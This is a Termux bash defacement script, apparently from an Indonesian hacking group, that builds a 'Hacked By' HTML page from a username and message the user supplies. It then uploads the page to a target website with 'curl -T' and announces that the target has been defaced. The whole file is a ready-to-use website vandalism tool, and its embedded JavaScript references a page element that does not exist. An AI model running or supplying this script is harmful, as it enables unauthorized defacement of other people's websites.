#!/data/data/com.termux/usr/bin/bash
clear
toilet --metal "MR_DARK"
echo '[+] Author : MR_DARK'
echo '[+] Team : DARK NETWORK'
echo '[+] Github : https://www.github.com/DARK-02'
echo ''
echo ''
read -p $'\e[32mWeb Target :\e[0m ' target
read -p $'\e[32mBuat Username Untuk Di script :\e[0m ' user
read -p $'\e[32mpesan  :\e[0m ' pesan1
rm -f index.html  # Gunakan -f untuk menghindari pesan error jika file tidak ada
cat <<LOGIN > index.html
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8">
    <title>Hacked By $user</title>
    <link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'/>
    <link href='http://dhewa.yu.tl/files/fb-indonesia.jpg' rel='SHORTCUT ICON'/>
    <style type="text/css">
        body {
            background-color: black;
            color: white;
            font-family: Orbitron, sans-serif;
            text-align: center;
        }
        h1 {
            font-size: 50px;
        }
        .neon {
            color: #FFFFFF;
            text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;
        }
        #matrix {
            color: #FFFFFF;
            font-family: Arial, Courier, Monotype;
            font-size: 10pt;
        }
        .jokitz1, .jokitz2 {
            text-align: center;
        }
    </style>
    <script type="text/javascript">
        // Disable right click
        document.addEventListener('contextmenu', event => event.preventDefault());
    </script>
</head>
<body>
    <h1>Your Site Has Been Hacked By $user</h1>
    <div id="matrix">SCRIPT BY MR_DARK<br>pesan : $pesan1</div>
    <audio autoplay controls src="https://i.top4top.io/m_16036g6f61.mp3" type="audio/mpeg"></audio>
    <hr style='color:cyan; width: 550px;'>
    <script type="text/javascript">
        var charIndex = -1;
        var inputText = "Your message here"; // Ganti dengan pesan yang sesuai
        function writeContent(init) {
            if (init) {
                inputText = document.getElementById('contentToWrite').innerHTML;
            }
            if (charIndex == -1) {
                charIndex = 0;
            }
            var theChar = inputText.charAt(charIndex);
            document.getElementById('myContent').innerHTML += theChar + "<span id='blink'>_</span>";
            charIndex++;
            if (charIndex < inputText.length) {
                setTimeout(function() { writeContent(false); }, 100);
            }
        }
        writeContent(true);
    </script>
    <div id="myContent" style="color: cyan; font-size: 15px;"></div>
</body>
</html>
LOGIN

curl -T $HOME/index.html $target
echo -e "\e[1;32mTarget Anda Telah Di deface\e[0m"
